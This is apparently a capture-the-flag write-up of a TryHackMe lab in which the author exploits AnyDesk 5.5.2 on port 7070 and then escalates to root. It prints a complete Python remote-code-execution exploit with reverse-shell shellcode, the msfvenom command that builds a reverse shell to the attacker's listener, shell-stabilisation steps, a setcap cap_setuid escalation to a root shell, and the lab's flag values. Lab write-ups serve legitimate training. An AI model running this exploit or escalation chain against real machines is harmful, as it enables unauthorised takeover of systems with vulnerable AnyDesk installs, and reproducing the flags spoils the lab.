# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 7070 | SSL |

```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
| 256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_ 256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp open ssl/realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after: 2072-03-10T20:04:30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```




# RECONNAISSANCE
---

In this case, we are not dealing with a web application but, we have something interesting running on port `7070`, if we take a look at the port scan we can find:

```
AnyDesk Client
```

Let's search for an exploit regarding this:


![Pasted image 20250610124643.png](../../IMAGES/Pasted%20image%2020250610124643.png)

The first ones talked about `CVE-2024-12754` but, the one we are interested in is the `AnyDesk 5.5.2` RCE, let's check it out:


![Pasted image 20250610124748.png](../../IMAGES/Pasted%20image%2020250610124748.png)

Ok, we got a python exploit on here, let's proceed to exploitation:



# EXPLOITATION
---

Let's get the exploit to our machine:

Link: https://www.exploit-db.com/exploits/49613

First of all, once we get the exploit, we can see this:

```PYTHON
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
 d = chr(0x3e)+chr(0xd1)+chr(0x1)
 d += struct.pack('>I', ad_id)
 d += struct.pack('>I', 0)
 d += chr(0x2)+chr(os)
 d += struct.pack('>I', len(hn)) + hn
 d += struct.pack('>I', len(user)) + user
 d += struct.pack('>I', 0)
 d += struct.pack('>I', len(inf)) + inf
 d += chr(0)
 d += struct.pack('>I', len(func)) + func
 d += chr(0x2)+chr(0xc3)+chr(0x51)
 return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode = b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

We need to craft our own shellcode, let's use `msfvenom` for it:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

Once we get our shellcode, we need to replace it on the script, we also need to change the `IP` to match the THM machine's IP, final script should look similar to this one:

```python
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.90.151'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
 d = chr(0x3e)+chr(0xd1)+chr(0x1)
 d += struct.pack('>I', ad_id)
 d += struct.pack('>I', 0)
 d += chr(0x2)+chr(os)
 d += struct.pack('>I', len(hn)) + hn
 d += struct.pack('>I', len(user)) + user
 d += struct.pack('>I', 0)
 d += struct.pack('>I', len(inf)) + inf
 d += chr(0)
 d += struct.pack('>I', len(func)) + func
 d += chr(0x2)+chr(0xc3)+chr(0x51)
 return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode = b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x87\x2a\x88"
shellcode += b"\xed\x17\xae\x2b\x46\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xed\x03\xd0\x74\x7d"
shellcode += b"\xac\x74\x2c\x86\x74\x87\xe8\x5f\x39\x63\xff"
shellcode += b"\x85\x2a\x99\xb1\x1d\xa0\x3e\x5a\xd6\x62\x01"
shellcode += b"\x0b\x7d\xbe\x71\x2c\xad\x72\x87\xe8\x7d\xad"
shellcode += b"\x75\x0e\x78\xe4\xe2\xcc\x4f\xa1\x2e\x33\x71"
shellcode += b"\x40\xb3\xb5\x8e\xe6\x90\x69\xe5\x43\xe6\xc2"
shellcode += b"\x64\xc6\x2b\x15\xcf\xa3\x6f\xbf\x40\xe6\xa2"
shellcode += b"\xa0\x88\x2f\x88\xed\x17\xae\x2b\x46"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

Now, set up a listener and execute the exploit with `python2`:

![Pasted image 20250610125955.png](../../IMAGES/Pasted%20image%2020250610125955.png)

We got our shell, let's proceed with privilege escalation.



# PRIVILEGE ESCALATION
---


First of all, let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250610130506.png](../../IMAGES/Pasted%20image%2020250610130506.png)

Time to use `linpeas`:

![Pasted image 20250610130840.png](../../IMAGES/Pasted%20image%2020250610130840.png)

As seen, we got an unknown SUID binary, this is the `setcap` binary, The `setcap` binary allows setting file capabilities with root privileges. By granting `cap_setuid` capability to a malicious binary we control, we can escalate to root when executing it.

Let's do it, for this, we can go with different ways to escalate our privileges, in this case, we will do it with python.

**Copy the Python interpreter** to a writable location:

```python
cp $(which python3) /tmp/mypython
```

**Grant `cap_setuid` capability** to the copied Python binary:

```python
/sbin/setcap cap_setuid+ep /tmp/mypython
```

**Create a Python script** to spawn a root shell:

```python
cat <<EOF > /tmp/rootme.py
import os
os.setuid(0)
os.system("/bin/bash")
EOF
```

**Make the script executable**:

```bash
chmod +x /tmp/rootme.py
```

**Run the script** with your privileged Python binary:

```
/tmp/mypython /tmp/rootme.py
```

![Pasted image 20250610131649.png](../../IMAGES/Pasted%20image%2020250610131649.png)

As seen, we get a root shell exploiting the root capabilities we assigned, let's get both flags:

```
root@desktop:/tmp# cat /home/annie/user.txt
THM{N0t_Ju5t_ANY_D3sk}

root@desktop:/tmp# cat /root/root.txt
THM{0nly_th3m_5.5.2_D3sk}
```

## Fun Fact
---

As a fun fact, this box included a 1 month voucher for the blood taker:

![Pasted image 20250610131926.png](../../IMAGES/Pasted%20image%2020250610131926.png)


![Pasted image 20250610131827.png](../../IMAGES/Pasted%20image%2020250610131827.png)

